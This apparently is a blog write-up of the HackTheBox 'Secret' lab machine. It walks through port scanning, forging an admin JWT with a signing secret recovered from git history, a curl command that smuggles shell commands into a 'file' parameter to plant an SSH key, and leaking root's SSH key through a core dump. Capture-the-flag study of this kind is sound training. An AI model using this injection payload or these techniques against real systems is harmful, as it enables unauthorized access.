<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Secret - Easy | kkso's Writeups</title><meta name=keywords content><meta name=description content="Tools Used  Nmap  git apport-unpack  User Enumeration Nmap scan report for secret (10.10.11.120) Host is up (0.060s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1."><meta name=author content><link rel=canonical href=https://kkso.github.io/writeups/secret/><link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://kkso.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://kkso.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://kkso.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://kkso.github.io/apple-touch-icon.png><link rel=mask-icon href=https://kkso.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="Secret - Easy"><meta property="og:description" content="Tools Used  Nmap  git apport-unpack  User Enumeration Nmap scan report for secret (10.10.11.120) Host is up (0.060s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1."><meta property="og:type" content="article"><meta property="og:url" content="https://kkso.github.io/writeups/secret/"><meta property="article:section" content="Writeups"><meta property="article:published_time" content="2022-01-23T00:00:00+00:00"><meta property="article:modified_time" content="2022-01-23T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Secret - Easy"><meta name=twitter:description content="Tools Used  Nmap  git apport-unpack  User Enumeration Nmap scan report for secret (10.10.11.120) Host is up (0.060s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://kkso.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"Secret - Easy","item":"https://kkso.github.io/writeups/secret/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Secret - Easy","name":"Secret - Easy","description":"Tools Used  Nmap  git apport-unpack  User Enumeration Nmap scan report for secret (10.10.11.120) Host is up (0.060s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.","keywords":[],"articleBody":"Tools Used  Nmap  git apport-unpack  User Enumeration Nmap scan report for secret (10.10.11.120) Host is up (0.060s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) 3000/tcp open http Node.js (Express middleware) |_http-title: DUMB Docs | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=1/23%OT=22%CT=1%CU=33531%PV=Y%DS=2%DC=T%G=Y%TM=61ED29D OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Uptime guess: 18.014 days (since Wed Jan 5 04:52:02 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=258 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jan 23 05:11:39 2022 -- 1 IP address (1 host up) scanned in 39.61 seconds The initial nmap scans shows 3 active services:\n 1 SSH service open on port 22 1 HTTP service open on port 80 using nginx 1.18 1 HTTP service open on port 3000 using Node.js  The webpage on port 80 shows Documentation of how to access and use an api. The webpage also includes a download link to download the source code of the webserver. The page shows how to register and login a new user by curling and using certain payloads. The command: curl -X POST -H \"Content-Type: application/json\" -d '{\"name\": \"ABC123\", \"email\": \"ABC@example.com\", \"password\": \"123456\"}' http://10.10.11.120:3000/api/user/register/ is used to create a standard user account. Once this standard user account is created, the user can login using: curl -X POST -H \"Content-Type: application/json\" -d '{\"email\": \"ABC@example.com\", \"password\": \"123456\"}' http://10.10.11.120:3000/api/user/login .\nLike the Documentation states: we then get given the a JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWVkMmFkMjE0NWM3ODA0NjM0YzU1YzQiLCJuYW1lIjoiQUJDMTIzIiwiZW1haWwiOiJBQkNAZXhhbXBsZS5jb20iLCJpYXQiOjE2NDI5MzI5NTV9.Gs8_uGR5GOOTZYbVCSD7PaefBRakM1DiQ-wnjMIj9gU\nFootHold To gain access to the /priv/ directory on the webserver, the user must be an administrator. Viewing the source code, private.js shows the requirements of authorizing an administrator:\n router.get('/priv', verifytoken, (req, res) = {  // res.send(req.user)   const userinfo = { name: req.user }   const name = userinfo.name.name;   if (name == 'theadmin'){  res.json({  creds:{  role:\"admin\",  username:\"theadmin\",  desc : \"welcome back admin,\"  }  })  } For the admin to be granted, the username must be “theadmin”\nThe example Decoding the example JWT token given to us eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg can be decoded to show the following payload\n{ \"_id\": \"6114654d77f9a54e00f05777\", \"name\": \"theadmin\", \"email\": \"root@dasith.works\", \"iat\": 1628727669 } However reusing the example token to login does not work due to the verifytoken.js\nconst jwt = require(\"jsonwebtoken\");  module.exports = function (req, res, next) {  const token = req.header(\"auth-token\");  if (!token) return res.status(401).send(\"Access Denied\");   try {  const verified = jwt.verify(token, process.env.TOKEN_SECRET);  req.user = verified;  next();  } catch (err) {  res.status(400).send(\"Invalid Token\"); The current TOKEN_SECRET value stored in .env is “secret” Using jwt.io, a jwt token can be forged to include the signature verification. Even after, the implementation of the secret, the verification will fail.\nThe existence of a .git file in the source code shows that there is likely a git repository with all the commit history of the repository. Viewing the git log, commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 states “removed .env for security reasons”\nComparing the .env file before and after the commit shows the previous TOKEN_SECRET value:\ndiff --git a/.env b/.env index fb6f587..31db370 100644 --- a/.env +++ b/.env @@ -1,2 +1,2 @@ DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web' -TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE +TOKEN_SECRET = secret Using the discovered token, a new jwt token can be forged, and with the requirement of the auth-token filled, Remote Code execution can be implemented. Due to port 22 being open, the easiest method of accessing user is to dump a ssh public key into the user’s “authorized key file” which grants the attack access to the ssh server.\ncurl \\ -i \\ -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkyMGU1MzQzNDAzMjA0NjQ1MjM0YjkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6IkFCQ0BleGFtcGxlLmNvbSIsImlhdCI6MTYzNjk2MjE1Nn0.CeB4nsKvRxnabY1eZ8ZZW7FFne4kkNtlWg9yB0Z5zS4' \\ -G \\ --data-urlencode \"file=index.js; mkdir -p /home/dasith/.ssh; echo $sshkey1  /home/dasith/.ssh/authorized_keys\" \\ 'http://10.10.11.120/api/logs'  Privilege Escalation Checking the files in the /opt/ directory, there are 2 files, code.c and its compiled version called “count”. Running the code allows the attack to enter a file path or directory path:\nIf the user enters a Directory Path, all files and directories inside the specified one will be shown with their permissions. For example, only root has permissions for the .ssh directory\nEnter source file/directory name: /root/ -rw-r--r-- .viminfo drwxr-xr-x .. -rw-r--r-- .bashrc drwxr-xr-x .local drwxr-xr-x snap lrwxrwxrwx .bash_history drwx------ .config drwxr-xr-x .pm2 -rw-r--r-- .profile drwxr-xr-x .vim drwx------ . drwx------ .cache -r-------- root.txt drwxr-xr-x .npm drwx------ .ssh Total entries = 15 Regular files = 4 Directories = 10 Symbolic links = 1 Save results a file? [y/N]: If the user enters a File Path, the program counts all characters, words and lines in the file.\nEnter source file/directory name: /root/root.txt Total characters = 33 Total words = 2 Total lines = 2 Save results a file? [y/N]: Inspecting the code, shows that:\n the program runs temporarily in root to read directories and files. the program reads the file requested the program has enable coredump generation   void filecount(const char *path, char *summary) {  FILE *file;  char ch;  int characters, words, lines;   file = fopen(path, \"r\");   characters = words = lines = 0;  while ((ch = fgetc(file)) != EOF) }  int main() {   // drop privs to limit file write  setuid(getuid());  // Enable coredump generation  prctl(PR_SET_DUMPABLE, 1);  printf(\"Save results a file? [y/N]: \");  res = getchar();  if (res == 121 || res == 89) {  printf(\"Path: \");  scanf(\"%99s\", path);  FILE *fp = fopen(path, \"a\");  if (fp != NULL) {  fputs(summary, fp);  fclose(fp);  } With this knowledge, the attacker can read directories and files they do not have permission to. Viewing the root directory shows a ssh folder meaning there may be possibility of dumping root’s ssh private key.\nCore Dump After using the program’s directory and file search, root’s ssh private key can be discovered in /root/ssh/id_rsa. To dump the file, bring the process to the background with ctrl+z after the program requests for the user to save the results. Active processes can be viewed by using the “ps” command. Match the Process ID associated with program and kill the process and bring the program back to the foreground to crash the program. Once the program is killed, the core dump files can be located at /var/crashes. Using apport-unpack, the core dump can be made easier to read. From there the dump can be run through strings in order to find the private key. Once the key is retrieved, the attacker can ssh into root using the -i to allocate the private key.\n","wordCount":"1124","inLanguage":"en","datePublished":"2022-01-23T00:00:00Z","dateModified":"2022-01-23T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://kkso.github.io/writeups/secret/"},"publisher":{"@type":"Organization","name":"kkso's Writeups","logo":{"@type":"ImageObject","url":"https://kkso.github.io/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://kkso.github.io/ accesskey=h title="kkso's Writeups (Alt + H)">kkso's Writeups</a>
<span class=logo-switches></span></div><ul id=menu><li><a href=https://kkso.github.io/cvebreakdowns/ title="CVE Breakdowns"><span>CVE Breakdowns</span></a></li><li><a href=https://kkso.github.io/writeups/ title="HackTheBox Writeups"><span>HackTheBox Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>Secret - Easy</h1><div class=post-meta><span title="2022-01-23 00:00:00 +0000 UTC">January 23, 2022</span>&nbsp;·&nbsp;6 min</div></header><div class=post-content><h3 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h3><ul><li>Nmap</li><li><img loading=lazy src=jwt.io alt=jwt.io></li><li>git</li><li>apport-unpack</li></ul><h1 id=user>User<a hidden class=anchor aria-hidden=true href=#user>#</a></h1><h3 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h3><pre tabindex=0><code>Nmap scan report for secret (10.10.11.120)
Host is up (0.060s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/23%OT=22%CT=1%CU=33531%PV=Y%DS=2%DC=T%G=Y%TM=61ED29D
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 18.014 days (since Wed Jan  5 04:52:02 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 23 05:11:39 2022 -- 1 IP address (1 host up) scanned in 39.61 seconds
</code></pre><p>The initial nmap scans shows 3 active services:</p><ul><li>1 SSH service open on port 22</li><li>1 HTTP service open on port 80 using nginx 1.18</li><li>1 HTTP service open on port 3000 using Node.js</li></ul><p>The webpage on port 80 shows Documentation of how to access and use an api. The webpage also includes a download link to download the source code of the webserver. The page shows how to register and login a new user by curling and using certain payloads.
<img loading=lazy src=/img/Secret/image1.png alt=image1>
<img loading=lazy src=/img/Secret/image2.png alt=image2></p><p>The command: <code>curl -X POST -H "Content-Type: application/json" -d '{"name": "ABC123", "email": "ABC@example.com", "password": "123456"}' http://10.10.11.120:3000/api/user/register/</code> is used to create a standard user account. Once this standard user account is created, the user can login using: <code>curl -X POST -H "Content-Type: application/json" -d '{"email": "ABC@example.com", "password": "123456"}' http://10.10.11.120:3000/api/user/login</code> .</p><p>Like the Documentation states: we then get given the a JWT token: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWVkMmFkMjE0NWM3ODA0NjM0YzU1YzQiLCJuYW1lIjoiQUJDMTIzIiwiZW1haWwiOiJBQkNAZXhhbXBsZS5jb20iLCJpYXQiOjE2NDI5MzI5NTV9.Gs8_uGR5GOOTZYbVCSD7PaefBRakM1DiQ-wnjMIj9gU</code></p><h3 id=foothold>FootHold<a hidden class=anchor aria-hidden=true href=#foothold>#</a></h3><p><img loading=lazy src=/img/Secret/image3.png alt=image3>
To gain access to the /priv/ directory on the webserver, the user must be an administrator. Viewing the source code, private.js shows the requirements of authorizing an administrator:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>router</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/priv&#39;</span>, <span style=color:#a6e22e>verifytoken</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
</span></span><span style=display:flex><span>   <span style=color:#75715e>// res.send(req.user)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>userinfo</span> <span style=color:#f92672>=</span> { <span style=color:#a6e22e>name</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>user</span> }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>userinfo</span>.<span style=color:#a6e22e>name</span>.<span style=color:#a6e22e>name</span>;
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>name</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;theadmin&#39;</span>){
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>({
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>creds</span><span style=color:#f92672>:</span>{
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>role</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;admin&#34;</span>, 
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>username</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;theadmin&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>desc</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;welcome back admin,&#34;</span>
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        })
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>For the admin to be granted, the username must be &ldquo;theadmin&rdquo;</p><p>The example Decoding the example JWT token given to us <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg</code> can be decoded to show the following payload</p><pre tabindex=0><code>{
  &#34;_id&#34;: &#34;6114654d77f9a54e00f05777&#34;,
  &#34;name&#34;: &#34;theadmin&#34;,
  &#34;email&#34;: &#34;root@dasith.works&#34;,
  &#34;iat&#34;: 1628727669
}
</code></pre><p>However reusing the example token to login does not work due to the verifytoken.js</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>jwt</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;jsonwebtoken&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>module</span>.<span style=color:#a6e22e>exports</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>, <span style=color:#a6e22e>next</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>token</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;auth-token&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>token</span>) <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>401</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;Access Denied&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>verified</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>jwt</span>.<span style=color:#a6e22e>verify</span>(<span style=color:#a6e22e>token</span>, <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>TOKEN_SECRET</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>verified</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>next</span>();
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>err</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>status</span>(<span style=color:#ae81ff>400</span>).<span style=color:#a6e22e>send</span>(<span style=color:#e6db74>&#34;Invalid Token&#34;</span>);
</span></span></code></pre></div><p>The current TOKEN_SECRET value stored in .env is &ldquo;secret&rdquo;
Using jwt.io, a jwt token can be forged to include the signature verification. Even after, the implementation of the secret, the verification will fail.</p><p>The existence of a .git file in the source code shows that there is likely a git repository with all the commit history of the repository. Viewing the git log, commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 states &ldquo;removed .env for security reasons&rdquo;</p><p>Comparing the .env file before and after the commit shows the previous TOKEN_SECRET value:</p><pre tabindex=0><code>diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = &#39;mongodb://127.0.0.1:27017/auth-web&#39;
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
</code></pre><p>Using the discovered token, a new jwt token can be forged, and with the requirement of the auth-token filled, Remote Code execution can be implemented. Due to port 22 being open, the easiest method of accessing user is to dump a ssh public key into the user&rsquo;s &ldquo;authorized key file&rdquo; which grants the attack access to the ssh server.</p><pre tabindex=0><code>curl \
-i \
-H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkyMGU1MzQzNDAzMjA0NjQ1MjM0YjkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6IkFCQ0BleGFtcGxlLmNvbSIsImlhdCI6MTYzNjk2MjE1Nn0.CeB4nsKvRxnabY1eZ8ZZW7FFne4kkNtlWg9yB0Z5zS4&#39; \
  -G \
--data-urlencode &#34;file=index.js; mkdir -p /home/dasith/.ssh; echo $sshkey1 &gt;&gt; /home/dasith/.ssh/authorized_keys&#34; \
&#39;http://10.10.11.120/api/logs&#39;                                     
</code></pre><hr><h1 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h1><p>Checking the files in the /opt/ directory, there are 2 files, code.c and its compiled version called &ldquo;count&rdquo;. Running the code allows the attack to enter a file path or directory path:</p><p>If the user enters a Directory Path, all files and directories inside the specified one will be shown with their permissions. For example, only root has permissions for the .ssh directory</p><pre tabindex=0><code>Enter source file/directory name: /root/
-rw-r--r--      .viminfo
drwxr-xr-x      ..
-rw-r--r--      .bashrc
drwxr-xr-x      .local
drwxr-xr-x      snap
lrwxrwxrwx      .bash_history
drwx------      .config
drwxr-xr-x      .pm2
-rw-r--r--      .profile
drwxr-xr-x      .vim
drwx------      .
drwx------      .cache
-r--------      root.txt
drwxr-xr-x      .npm
drwx------      .ssh

Total entries       = 15
Regular files       = 4
Directories         = 10
Symbolic links      = 1
Save results a file? [y/N]:
</code></pre><p>If the user enters a File Path, the program counts all characters, words and lines in the file.</p><pre tabindex=0><code>Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]:
</code></pre><p>Inspecting the code, shows that:</p><ul><li>the program runs temporarily in root to read directories and files.</li><li>the program reads the file requested</li><li>the program has enable coredump generation</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>filecount</span>(<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>path, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>summary)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    FILE <span style=color:#f92672>*</span>file;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> ch;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> characters, words, lines;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    file <span style=color:#f92672>=</span> fopen(path, <span style=color:#e6db74>&#34;r&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    characters <span style=color:#f92672>=</span> words <span style=color:#f92672>=</span> lines <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> ((ch <span style=color:#f92672>=</span> fgetc(file)) <span style=color:#f92672>!=</span> EOF)
